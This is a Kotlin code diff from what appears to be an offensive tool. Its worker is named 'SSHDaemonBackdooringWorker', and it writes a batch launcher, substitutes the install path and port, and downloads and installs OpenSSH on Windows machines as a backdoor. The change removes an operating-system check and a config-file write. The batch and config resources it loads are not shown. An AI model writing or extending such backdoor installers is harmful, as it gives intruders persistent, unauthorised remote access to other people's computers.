@@ -18,26 +18,17 @@ class SSHDaemonInstaller(
     override val name = "SSHDaemonBackdooringWorker"
 
     override fun installWindows(file: File): File {
-        if (entkerner.system == SystemType.WINDOWS) {
-            val sshDaemonFile = File(file, "RunSshDaemon.bat")
-            sshDaemonFile.createNewFile()
+        val sshDaemonFile = File(file, "RunSshDaemon.bat")
+        sshDaemonFile.createNewFile()
+        val batch = String(JavaClassLoaderResources.getResource("windows/SshDaemon.bat").readBytes())
+            .replace("\$path\$", (file.toPath() / "OpenSSH-Win64").absolutePathString())
+            .replace("\$port\$", port.toString())
+        sshDaemonFile.writeText(batch)
 
-            val batch = String(JavaClassLoaderResources.getResource("windows/SshDaemon.bat").readBytes())
-                .replace("\$path\$", (file.toPath() / "OpenSSH-Win64").absolutePathString())
-                .replace("\$port\$", port.toString())
-
-            sshDaemonFile.writeText(batch)
-
-            val createSshDConf = File((file.toPath() / "OpenSSH-Win64").toFile(), "sshd.conf")
-            createSshDConf.writeBytes(JavaClassLoaderResources.getResource("ssh/SshDaemon.conf").readBytes())
-
-            runBlocking {
-                OpenSSHDaemonInstallerWindows.installFile(httpClient, file)
-            }
-
-            return sshDaemonFile
+        runBlocking {
+            OpenSSHDaemonInstallerWindows.installFile(httpClient, file)
         }
-        return file
+        return sshDaemonFile
     }
 
     override fun installLinux(file: File) {
